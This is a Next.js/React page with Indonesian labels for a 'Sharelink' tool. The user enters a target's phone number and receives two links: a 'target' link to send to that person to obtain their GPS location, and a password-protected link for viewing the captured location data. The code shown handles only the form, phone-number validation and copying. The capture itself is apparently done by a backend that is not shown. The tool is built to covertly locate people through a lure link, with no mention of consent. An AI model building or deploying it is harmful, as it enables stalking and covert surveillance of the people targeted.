'use client'

import { useEffect } from 'react'
import { useState } from 'react'
import { Button } from '@/components/ui/button'
import { Input } from '@/components/ui/input'
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card'
import { Label } from '@/components/ui/label'
import { Copy, Check, Link2, Eye, MapPin } from 'lucide-react'

interface TrackingResult {
  id: string
  linkTarget: string
  linkView: string
}

export default function HomePage() {
  useEffect(() => {
    document.title = 'Buat Link'
  }, [])

  const [nomorTarget, setNomorTarget] = useState('')
  const [loading, setLoading] = useState(false)
  const [result, setResult] = useState<TrackingResult | null>(null)
  const [copiedTarget, setCopiedTarget] = useState(false)
  const [copiedView, setCopiedView] = useState(false)
  const [error, setError] = useState('')

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    if (!nomorTarget.trim()) {
      setError('Nomor telepon wajib diisi')
      return
    }

    // Validasi nomor telepon Indonesia
    const validation = validatePhoneNumber(nomorTarget)
    if (!validation.valid) {
      setError(validation.message)
      return
    }

    setLoading(true)
    setError('')
    setResult(null)

    try {
      const res = await fetch('/api/tracking', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ nomor_target: validation.formatted })
      })

      const data = await res.json()

      if (!res.ok) {
        throw new Error(data.error || 'Gagal membuat tracking')
      }

      setResult(data.data)
      setNomorTarget('')
    } catch (err) {
      setError(err instanceof Error ? err.message : 'Terjadi kesalahan')
    } finally {
      setLoading(false)
    }
  }

  const validatePhoneNumber = (phone: string): { valid: boolean; message: string; formatted: string } => {
    // Hapus spasi dan tanda hubung untuk memproses
    let cleaned = phone.replace(/[\s\-()]/g, '')
    
    // Jika dimulai dengan +62, ubah menjadi 62
    if (cleaned.startsWith('+62')) {
      cleaned = cleaned.replace('+62', '62')
    }
    
    // Validasi hanya angka
    if (!/^\d+$/.test(cleaned)) {
      return {
        valid: false,
        message: 'Nomor telepon hanya boleh berisi angka',
        formatted: ''
      }
    }

    // Validasi format Indonesia
    const isValidFormat = cleaned.startsWith('08') || cleaned.startsWith('628')
    if (!isValidFormat) {
      return {
        valid: false,
        message: 'Nomor harus diawali dengan 08 (domestik) atau 628 (internasional)',
        formatted: ''
      }
    }

    // Validasi panjang digit
    if (cleaned.length < 10 || cleaned.length > 13) {
      return {
        valid: false,
        message: `Nomor telepon harus 10-13 digit (saat ini: ${cleaned.length} digit)`,
        formatted: ''
      }
    }

    return {
      valid: true,
      message: '',
      formatted: cleaned
    }
  }

  const handleNomorTargetChange = (value: string) => {
    // Hanya izinkan angka, +, spasi, dan tanda hubung
    const filtered = value.replace(/[^0-9+\s\-()]/g, '')
    setNomorTarget(filtered)
    setError('')
  }

  const copyToClipboard = async (text: string, type: 'target' | 'view') => {
    const fullUrl = `${window.location.origin}${text}`
    await navigator.clipboard.writeText(fullUrl)
    if (type === 'target') {
      setCopiedTarget(true)
      setTimeout(() => setCopiedTarget(false), 2000)
    } else {
      setCopiedView(true)
      setTimeout(() => setCopiedView(false), 2000)
    }
  }

  return (
    <main className="min-h-screen flex items-center justify-center p-4 bg-muted/30">
      <div className="w-full max-w-lg space-y-6">
        <div className="text-center space-y-2">
          <div className="flex items-center justify-center gap-2">
            <MapPin className="h-8 w-8 text-primary" />
            <h1 className="text-3xl font-bold">Sharelink </h1>
          </div>
          <p className="text-muted-foreground">
            Buat link untuk mendapatkan informasi GPS
          </p>
        </div>

        <Card>
          <CardHeader>
            <CardTitle className="flex items-center gap-2">
              <Link2 className="h-5 w-5" />
              Buat Link Tracking
            </CardTitle>
            <CardDescription>
              Masukkan nomor telepon untuk membuat link tracking
            </CardDescription>
          </CardHeader>
          <CardContent>
            <form onSubmit={handleSubmit} className="space-y-4">
              <div className="space-y-2">
                <Label htmlFor="nomor_target">Nomor Telepon Indonesia</Label>
                <Input
                  id="nomor_target"
                  type="text"
                  placeholder="Contoh: 08123456789 atau 62812345678 atau +62812345678"
                  value={nomorTarget}
                  onChange={(e) => handleNomorTargetChange(e.target.value)}
                  disabled={loading}
                />
                <p className="text-xs text-muted-foreground">
                  Format: 08xx (10-13 digit) atau 628xx / +628xx
                </p>
              </div>
              {error && (
                <p className="text-sm text-destructive">{error}</p>
              )}
              <Button type="submit" className="w-full" disabled={loading}>
                {loading ? 'Membuat...' : 'Buat Link Tracking'}
              </Button>
            </form>
          </CardContent>
        </Card>

        {result && (
          <Card className="border-primary/20 bg-primary/5">
            <CardHeader>
              <CardTitle className="text-lg">Link Berhasil Dibuat!</CardTitle>
              <CardDescription>
                Gunakan link berikut untuk tracking
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="space-y-2">
                <Label className="flex items-center gap-2 text-sm font-medium">
                  <Link2 className="h-4 w-4" />
                  Link Target
                </Label>
                <div className="flex items-center gap-2">
                  <Input
                    readOnly
                    value={`${typeof window !== 'undefined' ? window.location.origin : ''}${result.linkTarget}`}
                    className="bg-background font-mono text-sm"
                  />
                  <Button
                    type="button"
                    variant="outline"
                    size="icon"
                    onClick={() => copyToClipboard(result.linkTarget, 'target')}
                  >
                    {copiedTarget ? <Check className="h-4 w-4 text-green-500" /> : <Copy className="h-4 w-4" />}
                  </Button>
                </div>
                <p className="text-xs text-muted-foreground">
                  Kirim link ini ke target untuk mendapatkan lokasi.
                </p>
              </div>

              <div className="space-y-2">
                <Label className="flex items-center gap-2 text-sm font-medium">
                  <Eye className="h-4 w-4" />
                  Link Viewing
                </Label>
                <div className="flex items-center gap-2">
                  <Input
                    readOnly
                    value={`${typeof window !== 'undefined' ? window.location.origin : ''}${result.linkView}`}
                    className="bg-background font-mono text-sm"
                  />
                  <Button
                    type="button"
                    variant="outline"
                    size="icon"
                    onClick={() => copyToClipboard(result.linkView, 'view')}
                  >
                    {copiedView ? <Check className="h-4 w-4 text-green-500" /> : <Copy className="h-4 w-4" />}
                  </Button>
                </div>
                <p className="text-xs text-muted-foreground">
                  Gunakan link ini untuk melihat hasil data lokasi tracking (memerlukan password)
                </p>
              </div>
            </CardContent>
          </Card>
        )}

      </div>
    </main>
  )
}
